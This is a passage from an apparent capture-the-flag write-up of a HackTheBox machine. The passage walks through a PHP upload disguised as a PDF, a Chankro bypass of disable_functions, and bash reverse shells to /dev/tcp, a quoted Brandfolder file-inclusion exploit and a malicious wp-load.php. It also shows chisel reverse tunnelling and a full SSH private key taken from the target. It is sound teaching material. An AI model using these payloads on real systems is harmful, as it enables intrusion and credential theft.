</span></span><span style="display:flex;"><span>2022/11/04 14:14:16 Finished
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
</span></span></code></pre></div><p><em>Uploads</em> directory has been found, however looks like directory listing is disabled in it, but this is not a problem because I can try to access the <em>temp.pdf.php</em> that I uploaded previously:</p>
<p><img src="accessing_temp.pdf.php.png" alt="Accessing temp.pdf.php"></p>
<p>Worked!!</p>
<p>It&rsquo;s time to uplaod some php code to get a reverse shell.</p>
<p>The first thing I&rsquo;ll do is execute <em>phpinfo()</em> function to see if there are any disabled functions like <em>system(), exec() &hellip;</em> which will prevent me from running commands on the target system.</p>
<p><img src="phpinfo_file_upload.png" alt="Uploading phpinfo()"></p>
<p><img src="disable_functions.png" alt="Disable Functions"></p>
<p>Unfortunately most useful functions are disabled. I need to find other ways to get a shell on the target.</p>
<h3 id="bypassing-disable-functions-using-mail-to-get-rce">Bypassing Disable Functions using mail() To Get RCE</h3>
<p>After googling a little bit, I came accross this 

<a href="https://infosecwriteups.com/how-i-bypassed-disable-functions-in-php-to-get-a-remote-shell-48b827d54979" target="_blank"><em>blog post</em></a> about how to <em>bypass disable_functions</em> in php.</p>
<p>And using 

<a href="https://github.com/TarlogicSecurity/Chankro" target="_blank"><em>chankro</em></a>, I can create a malicious php file that will allow me to get a reverse shell once I navigate to the uploaded file:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ cat rev.sh 
</span></span><span style="display:flex;"><span>bash -c <span style="color:#e6db74">&#39;bash -i &gt;&amp; /dev/tcp/10.10.16.6/1234 0&gt;&amp;1&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$ python2 /opt/Chankro/chankro.py --arch <span style="color:#ae81ff">64</span> --input rev.sh --output chan.php --path /dev/shm
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>     -<span style="color:#f92672">=[</span> Chankro <span style="color:#f92672">]=</span>-
</span></span><span style="display:flex;"><span>    -<span style="color:#f92672">={</span> @TheXC3LL <span style="color:#f92672">}=</span>-
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Binary file: rev.sh
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Architecture: x64
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Final PHP: chan.php
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> File created!
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$ ls -la
</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">28</span>
</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">2</span> kali kali  <span style="color:#ae81ff">4096</span> Nov  <span style="color:#ae81ff">4</span> 15:59 .
</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">7</span> kali kali  <span style="color:#ae81ff">4096</span> Nov  <span style="color:#ae81ff">3</span> 21:07 ..
</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> kali kali <span style="color:#ae81ff">11710</span> Nov  <span style="color:#ae81ff">4</span> 15:58 chan.php
</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> kali kali    <span style="color:#ae81ff">51</span> Nov  <span style="color:#ae81ff">4</span> 15:56 rev.sh
</span></span></code></pre></div><ul>
<li><em>&ndash;arch</em> to specify the architecture.</li>
<li><em>&ndash;input</em> to specify the that contains the malicious file to be executed.</li>
<li><em>&ndash;output</em> to specify the output file.</li>
<li><em>&ndash;path</em> to specify the path where some necessary files will be written, in this case I chose <em>/dev/shm</em> which is a linux directory writable by everyone similar to <em>/tmp</em>.</li>
</ul>
<p>After executing the command, a new php file called <em>chan.php</em> will be created that holds the necessary payload to get a reverse shell. So what I&rsquo;ll do is create a new file <em>rev.pdf.php</em> that contains initailly the magic bytes <code>%PDF-</code>, then append to it the content of <em>chan.php</em> and finally upload it to the server using 

<a href="https://curl.se/" target="_blank"><em>curl</em></a>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ curl -s -XPOST http://10.10.11.173/logs/report_log_upload.php -F <span style="color:#e6db74">&#34;pdfFile=@rev.pdf.php;type=application/pdf&#34;</span> -F <span style="color:#e6db74">&#34;administrator=true&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>&lt;p style<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;color:white&#39;</span>&gt;&lt;big size<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;5&#39;</span>&gt;File uploaded successfully!&lt;/big&gt;&lt;/p&gt;
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><ul>
<li><em>-s</em> to specify silent mode (usually used when piping curl&rsquo;s output so that no download banner will appear).</li>
<li><em>-X</em> followed by the request method (space is not necessary but also not required).</li>
<li><em>-F</em> to specify the data sent, however it will be sent using <em>multipart/form-data</em> content-type. Data looks like this: &lsquo;<em>[parameter name]=[value];[headers specific only to current data]=[value]</em>&rsquo;.
<ul>
<li>In this case, <em>pdfFile</em> was the file paramater name, <em>@</em> is used to get the content of the file and use it as value.</li>
<li><em>type</em> header is the <em>Content-Type</em> header specific to the file being sent, in this case <em>application/pdf</em>.</li>
<li>Finally, as seen using 

<a href="https://portswigger.net/burp" target="_blank"><em>Burp Suite</em></a>, other data were being sent with the file, of parametername <em>administrator</em> and value <em>true</em>.</li>
</ul>
</li>
</ul>
<p><img src="getting_reverse_shell.png" alt="Getting Reverse Shell"></p>
<h2 id="post-enumeration-as-www-data">Post Enumeration As www-data</h2>
<p>Using <em>netstat</em> command, I can see that port <em>8080</em> is open but only accessible locally:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>www-data@moderators:/var/www/html/logs/uploads$ netstat -lntp
</span></span><span style="display:flex;"><span>netstat -lntp
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>Not all processes could be identified, non-owned process info
</span></span><span style="display:flex;"><span> will not be shown, you would have to be root to see it all.<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Active Internet connections <span style="color:#f92672">(</span>only servers<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
</span></span><span style="display:flex;"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
</span></span><span style="display:flex;"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
</span></span><span style="display:flex;"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
</span></span><span style="display:flex;"><span>tcp        <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
</span></span><span style="display:flex;"><span>tcp6       <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> :::80                   :::*                    LISTEN      -                   
</span></span><span style="display:flex;"><span>tcp6       <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span> :::22                   :::*                    LISTEN      -                   
</span></span></code></pre></div><p>I&rsquo;ll use curl to have an idea of what web application is running on port 8080:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>www-data@moderators:/var/www/html/logs/uploads$ curl http://127.0.0.1:8080/
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>Proudly powered by &lt;a href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://wordpress.org/&#34;</span>&gt;WordPress&lt;/a&gt;.
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><p>Looks like wordpress is running on this port. If I list all running processes using <em>ps</em> command, I get the following results:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>www-data@moderators:/var/www/html/logs/uploads$ ps aux
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>lexi         <span style="color:#ae81ff">886</span>  0.0  1.4 <span style="color:#ae81ff">306748</span> <span style="color:#ae81ff">59116</span> ?        S    05:39   0:03 /usr/bin/php -S 127.0.0.1:8080 -t /opt/site.new/
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><p>User <em>Lexi</em> is running this server form <em>/opt/site.new/</em>. Taking a quick look at the files inside, specifically at the <em>plugins</em> installed on this <em>wordpress</em> instance to see if I can find some exploits.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>www-data@moderators:/opt/site.new/wp-content/plugins$ ls -la
</span></span><span style="display:flex;"><span>ls -la
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">20</span>
</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">4</span> lexi moderators <span style="color:#ae81ff">4096</span> Jul <span style="color:#ae81ff">14</span> 10:50 .
</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">6</span> lexi moderators <span style="color:#ae81ff">4096</span> Nov  <span style="color:#ae81ff">4</span> 12:00 ..
</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">2</span> lexi moderators <span style="color:#ae81ff">4096</span> Jul <span style="color:#ae81ff">14</span> 10:50 brandfolder
</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> lexi moderators   <span style="color:#ae81ff">28</span> Sep <span style="color:#ae81ff">11</span>  <span style="color:#ae81ff">2021</span> index.php
</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">5</span> lexi moderators <span style="color:#ae81ff">4096</span> Jul <span style="color:#ae81ff">14</span> 10:50 passwords-manager
</span></span></code></pre></div><h3 id="discovering-vulnerable-wordpress-plugin">Discovering Vulnerable Wordpress Plugin</h3>
<p>I can see two installed plugins, <em>brandfolder</em> and <em>passwords-manager</em>. Using 

<a href="https://www.exploit-db.com/searchsploit" target="_blank"><em>searchsploit</em></a>, I found that <em>brandfolder</em> version 3.0 had 

<a href="https://www.offensive-security.com/metasploit-unleashed/file-inclusion-vulnerabilities/" target="_blank"><em>Local/Remote File Inclusion</em></a>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ searchsploit brandfolder
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
</span></span><span style="display:flex;"><span> Exploit Title                                                                                                                                                                    |  Path
</span></span><span style="display:flex;"><span>---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
</span></span><span style="display:flex;"><span>WordPress Plugin Brandfolder 3.0 - Local/Remote File Inclusion                                                                                                                    | php/webapps/39591.txt
</span></span><span style="display:flex;"><span>---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
</span></span><span style="display:flex;"><span>Shellcodes: No Results
</span></span></code></pre></div><p>Now, I need to make sure if <em>brandfolder version 3.0</em> is the one used in this instance:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>www-data@moderators:/opt/site.new/wp-content/plugins/brandfolder$ head brandfolder.php
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>&lt;?php
</span></span><span style="display:flex;"><span>/*
</span></span><span style="display:flex;"><span>Plugin Name: Brandfolder
</span></span><span style="display:flex;"><span>Plugin URI: http://wordpress.org/plugins/brandfolder/
</span></span><span style="display:flex;"><span>Description: Adds the ability <span style="color:#66d9ef">for</span> you to edit your Brandfolder inside Wordpress, easily embed it using our Popup Embed, and integrates with the Media Library.
</span></span><span style="display:flex;"><span>Version: 3.0
</span></span><span style="display:flex;"><span>Author: Brandfolder, Inc.
</span></span><span style="display:flex;"><span>Author URI: http://brandfolder.com
</span></span><span style="display:flex;"><span>License: GPLv2
</span></span><span style="display:flex;"><span>*/
</span></span></code></pre></div><p>It is confirmed now that the vulnerable <em>version 3.0</em> is being used.</p>
<p>The vulnerability is as follows:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ cat /usr/share/exploitdb/exploits/php/webapps/39591.txt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Exploit Title: Wordpress brandfolder plugin / RFI &amp; LFI</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Google Dork: inurl:wp-content/plugins/brandfolder</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Date: 03/22/2016</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Exploit Author: AMAR^SHG</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Vendor Homepage: https://brandfolder.com</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Software Link: https://wordpress.org/plugins/brandfolder/</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Version: &lt;=3.0</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Tested on: WAMP / Windows</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>I-Details
</span></span><span style="display:flex;"><span>The vulnerability occurs at the first lines of the file callback.php:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>&lt;?php
</span></span><span style="display:flex;"><span>  ini_set<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;display_errors&#39;</span>,1<span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>  ini_set<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;display_startup_errors&#39;</span>,1<span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>  error_reporting<span style="color:#f92672">(</span>-1<span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  require_once<span style="color:#f92672">(</span>$_REQUEST<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;wp_abspath&#39;</span><span style="color:#f92672">]</span>  . <span style="color:#e6db74">&#39;wp-load.php&#39;</span><span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>  require_once<span style="color:#f92672">(</span>$_REQUEST<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;wp_abspath&#39;</span><span style="color:#f92672">]</span>  . <span style="color:#e6db74">&#39;wp-admin/includes/media.php&#39;</span><span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>  require_once<span style="color:#f92672">(</span>$_REQUEST<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;wp_abspath&#39;</span><span style="color:#f92672">]</span>  . <span style="color:#e6db74">&#39;wp-admin/includes/file.php&#39;</span><span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>  require_once<span style="color:#f92672">(</span>$_REQUEST<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;wp_abspath&#39;</span><span style="color:#f92672">]</span>  . <span style="color:#e6db74">&#39;wp-admin/includes/image.php&#39;</span><span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>  require_once<span style="color:#f92672">(</span>$_REQUEST<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;wp_abspath&#39;</span><span style="color:#f92672">]</span>  . <span style="color:#e6db74">&#39;wp-admin/includes/post.php&#39;</span><span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$_REQUEST is based on the user input, so as you can guess,
</span></span><span style="display:flex;"><span>an attacker can depending on the context, host on a malicious server
</span></span><span style="display:flex;"><span>a file called wp-load.php, and disable its execution using an htaccess, or
</span></span><span style="display:flex;"><span>abuse the null byte character <span style="color:#f92672">(</span> %00, %2500 url-encoded<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>II-Proof of concept
</span></span><span style="display:flex;"><span>http://localhost/wp/wp-content/plugins/brandfolder/callback.php?wp_abspath<span style="color:#f92672">=</span>LFI/RFI
</span></span><span style="display:flex;"><span>http://localhost/wp/wp-content/plugins/brandfolder/callback.php?wp_abspath<span style="color:#f92672">=</span>../../../wp-config.php%00
</span></span><span style="display:flex;"><span>http://localhost/wp/wp-content/plugins/brandfolder/callback.php?wp_abspath<span style="color:#f92672">=</span>http://evil/
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Discovered by AMAR^SHG <span style="color:#f92672">(</span>aka kuroi<span style="color:#960050;background-color:#1e0010">&#39;</span>sh<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Greetings to RxR &amp; Nofawkx Al &amp; HolaKo
</span></span></code></pre></div><h3 id="exploiting-the-vulnerability-to-get-user">Exploiting The Vulnerability To Get User</h3>
<p>In brief, the vulnerability consists of <em>wp_abspath</em> variable, which is used as a directory where all the other files will be loaded, can be passed as user input. This means that I can pass my own <em>wp_abspath</em>, which will be pointing to a directory or web server containing malicious files having the same name as the ones <em>required</em> in the main php file, and force the server to run my malicious code.</p>
<p>So, what I&rsquo;ll do is create a file called <em>wp-load.php</em> inside any writable directory, in my case <em>/dev/shm</em>, which will contain php <em>system</em> function that will execute a reverse shell back to me:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>www-data@moderators:/dev/shm$ echo <span style="color:#e6db74">&#39;&lt;?php system(&#34;bash -c \&#34;bash -i &gt;&amp; /dev/tcp/10.10.16.32/8989 0&gt;&amp;1\&#34;&#34;) ?&gt;&#39;</span> &gt; wp-load.php
</span></span><span style="display:flex;"><span>www-data@moderators:/dev/shm$ curl http://127.0.0.1:8080/wp-content/plugins/brandfolder/callback.php?wp_abspath<span style="color:#f92672">=</span>/dev/shm/
</span></span></code></pre></div><p><img src="reverse_shell_as_lexi.png" alt="Lexi Reverse Shell"></p>
<h2 id="post-enumeration-as-lexi">Post Enumeration As Lexi</h2>
<p>Issuing the <code>id</code> command, I noticed that lexi is part of <em>moderators</em> group, and using <code>find</code> command, I was able to get every file owned by this group:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>lexi@moderators:~$ find / -group moderators 2&gt;/dev/null
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>/opt/site.new
</span></span><span style="display:flex;"><span>/opt/site.new/wp-trackback.php
</span></span><span style="display:flex;"><span>/opt/site.new/readme.html
</span></span><span style="display:flex;"><span>/opt/site.new/wp-signup.php
</span></span><span style="display:flex;"><span>/opt/site.new/xmlrpc.php
</span></span><span style="display:flex;"><span>/opt/site.new/wp-config.php
</span></span><span style="display:flex;"><span>....
</span></span></code></pre></div><p>It appears that this group owns wordpress site&rsquo;s files.</p>
<h3 id="portforwarding-wordpress">PortForwarding Wordpress</h3>
<p>Previously, I didn&rsquo;t fully interact with the site to see what&rsquo;s really going on, so this time I&rsquo;ll use 

<a href="https://github.com/jpillora/chisel" target="_blank"><em>chisel</em></a> to port forward the site to my attaching machine:</p>
<ul>
<li>On my attacking machine:
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ /opt/chisel/chisel_1.7.7_linux_amd64 server -p <span style="color:#ae81ff">9001</span> --reverse
</span></span></code></pre></div></li>
<li>On the target machine:
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>lexi@moderators:~$ ./chisel_1.7.7_linux_amd64 client 10.10.16.32:9001 R:127.0.0.1:8080:127.0.0.1:8080 &amp;
</span></span></code></pre></div></li>
</ul>
<p>However before portforwarding, I need to kill my reverse shell, because now wordpress site is hanging, so I&rsquo;ll copy <em>/home/lexi/.ssh/id_rsa</em> to my machine, then SSH from there as lexi and continue working:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>lexi@moderators:/opt/site.new/wp-content/plugins/brandfolder$ cat /home/lexi/.ssh/id_rsa
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>-----BEGIN OPENSSH PRIVATE KEY-----
</span></span><span style="display:flex;"><span>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
</span></span><span style="display:flex;"><span>NhAAAAAwEAAQAAAYEAmHVovmMN+t0u52ea6B357LfXjhIuTG4qkX6eY4iCw7EBGKwaEryn
</span></span><span style="display:flex;"><span>ECxvN0TbZia5MhfHhJDL88bk2CososBm6i0phnvPo5facWeOzP3vdIiJYdP0XrZ5mNMLbM
</span></span><span style="display:flex;"><span>ONvoGU8p8LKhlfzHIBqhPxB4N7Dgmcmg2DJ/QRXYrblAj8Bo1owGebWUBlB/tMcO3Yqvaa
</span></span><span style="display:flex;"><span>QCuzVluSShMrGKJVjL0n2Uvqf/Dw4ouQK3TwXdzrluhCo9icb+2QdA7KxmInb71+OT6rWV
</span></span><span style="display:flex;"><span>dQ5ymZTot+/qALnzlDkeUlT/RWtqJxJc6MlWy5/neegZRRd3YNhln/1GyL5aN/0O1gBwf3
</span></span><span style="display:flex;"><span>vY87IYFXK/W0a9Tj5mZ0RNDEOU+wSicM9nS3jabM1Unocq7jw36UPHQhniso6Q7ObvMnWv
</span></span><span style="display:flex;"><span>cxbVFo9M2axqTTnr/gFkLzU0sj8ms4nxoRagCvc8oOUpMXoauEwEwdpbq3FfT8aKGYKl64
</span></span><span style="display:flex;"><span>vO+aJxiTPkPpgI6L+pWCYfLXIXwcbVo2xXp3euHLAAAFiI1Y9VaNWPVWAAAAB3NzaC1yc2
</span></span><span style="display:flex;"><span>EAAAGBAJh1aL5jDfrdLudnmugd+ey3144SLkxuKpF+nmOIgsOxARisGhK8pxAsbzdE22Ym
</span></span><span style="display:flex;"><span>uTIXx4SQy/PG5NgqLKLAZuotKYZ7z6OX2nFnjsz973SIiWHT9F62eZjTC2zDjb6BlPKfCy
</span></span><span style="display:flex;"><span>oZX8xyAaoT8QeDew4JnJoNgyf0EV2K25QI/AaNaMBnm1lAZQf7THDt2Kr2mkArs1ZbkkoT
</span></span><span style="display:flex;"><span>KxiiVYy9J9lL6n/w8OKLkCt08F3c65boQqPYnG/tkHQOysZiJ2+9fjk+q1lXUOcpmU6Lfv
</span></span><span style="display:flex;"><span>6gC585Q5HlJU/0VraicSXOjJVsuf53noGUUXd2DYZZ/9Rsi+Wjf9DtYAcH972POyGBVyv1
</span></span><span style="display:flex;"><span>tGvU4+ZmdETQxDlPsEonDPZ0t42mzNVJ6HKu48N+lDx0IZ4rKOkOzm7zJ1r3MW1RaPTNms
</span></span><span style="display:flex;"><span>ak056/4BZC81NLI/JrOJ8aEWoAr3PKDlKTF6GrhMBMHaW6txX0/GihmCpeuLzvmicYkz5D
</span></span><span style="display:flex;"><span>6YCOi/qVgmHy1yF8HG1aNsV6d3rhywAAAAMBAAEAAAGAUZ2o8SL9/OojjeW8274QaVURpB
</span></span><span style="display:flex;"><span>C/kFL5nuH10LrnpfM/7wFTA+zSUqo275OBEHJyegqY2LLbPCmhoMcTFh2B+qMqs7/cLGvC
</span></span><span style="display:flex;"><span>mSsjG0JlyjC9uw1IqNtuxQ1V9GfLncyo/CmARI1I552wnmgGhEsyuRUULLRHHkBee4E2g0
</span></span><span style="display:flex;"><span>07/hX9meLdGy6J53f0OBBcCUny0Z+TZguniNgyHgHpYmpwxrcJVmyZx+2GxHzZoKX/yM2V
</span></span><span style="display:flex;"><span>vzjapmC7ECZLD2DEU+FQua6YHGw2KOs5tiX7BLQLr2R4cqz0akMZZJ0utIEWgDi5dX/EYy
</span></span><span style="display:flex;"><span>y8HfqtCPWmplcrhtw/DTRVLLCtiL0zzmYMiqvgh6OQZmFcLd0B0jbvBq3fq2l+UAMcUrWp
</span></span><span style="display:flex;"><span>o1D3Rv/KRIVRog9+7e6r8aRVPf/vIXy+jJlaWcG5Tq7a7wWwGQcqVW3aGnZivvc2aYMWVu
</span></span><span style="display:flex;"><span>x4G5F1sD9bamasGARP/j0UNTeBNai+Lg1WDIHOzxq8bQhI0Xvdp2reFFzLGn8ePh0hAAAA
</span></span><span style="display:flex;"><span>wEaFdCpqhzFIqnwgDxrrQJ4QlvysZbMCVgxApzM5SLtAt6jQLBCLrOwe/DYpdFOjIK888U
</span></span><span style="display:flex;"><span>0IRMzUtQjoP+RNU1PJZtB+neDkw6Kl1Muf4DCnTXr9mwyVlMQHmW1asWiEDr66YqLiKSF6
</span></span><span style="display:flex;"><span>CZHYRpFM4qUA+w3ABi8OJ+wzs+KDVk4Aw+v+AotbL9JStLBksR5P08sxAivWT/KbXMifJn
</span></span><span style="display:flex;"><span>LrcrmS/t+QdOG2Vf/7ebYiyBbg1TD4BUAsjKZs8kByr6PoKQAAAMEAyQ1JW3/xrUZyhlWn
</span></span><span style="display:flex;"><span>NnYVC0xcmSAkl90jHyW5AhR+5neuIu548xnk8a3PSO6j3w7kEmJTiOorwzAdM/u9CqWiaU
</span></span><span style="display:flex;"><span>h7E4bnCEoakAlftaJsXWUtf1G7ZXcK587Ccxv330XHToH4HqF408oC/mM40/JNJ9Rqa9Io
</span></span><span style="display:flex;"><span>9azk0fEjIQmjF0GqdNTBfSNqoqZX7HTV34FO+8mj+7fFvrFOnHKsa2FiwADUgEmkw2jJ63
</span></span><span style="display:flex;"><span>egq/DaGJECdxk9CNDElLVQxBs3X4i/AAAAwQDCIEQcdMnPI9cP5WUOmWWNH6jlpEpsF0qm
</span></span><span style="display:flex;"><span>0iAt4qjy/3uoN0NdQrX+8laOMIzRVe/Br4Py4NVmRTsMfU5t/1Jz/DXJoy9CcXD5VKkUnU
</span></span><span style="display:flex;"><span>p668wxSJC8y/5cYKTeE8rwhDXxP0I5ZJztCYf8bL2BWSWF/h4iiUW4mMKyAzvg/iDfjGmb
</span></span><span style="display:flex;"><span>xA8bieu1cmlE5GJgbXeuxeDfRyzWtLfYCwZU5E9RHz0D+1x1M9P+EaNVQu0p3vsS8rWJly
</span></span><span style="display:flex;"><span>J/dOO74/zovfUAAAAPbGV4aUBtb2RlcmF0b3JzAQIDBA<span style="color:#f92672">==</span>
</span></span><span style="display:flex;"><span>-----END OPENSSH PRIVATE KEY-----
</span></span></code></pre></div><ul>
<li>SSH as lexi:
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ chmod <span style="color:#ae81ff">600</span> lexi_id_rsa
</span></span><span style="display:flex;"><span>$ ssh -i lexi_id_rsa lexi@10.10.11.173
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>lexi@moderators:~$ id
</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>lexi<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>lexi<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>lexi<span style="color:#f92672">)</span>,1002<span style="color:#f92672">(</span>moderators<span style="color:#f92672">)</span>
</span></span></code></pre></div></li>
</ul>
<p>Nevertheless, when I access the site from my machine, it looks very ugly:</p>
<p><img src="accessing_wordpress.png" alt="Accessing Wordpress First Time"></p>
<p>So, I&rsquo;ll press [CTRL + U] on my keyboard to view the source code of this site:</p>
<p><img src="investigating_error.png" alt="Investigating The Error"></p>
<p>It appears that the error is comming from <em>moderators.htb</em> being the domain accessed by default to load files. To fix this, I need to add <em>moderators.htb</em> to my <em>/etc/hosts</em> file in the <em>127.0.0.1</em> entry.</p>
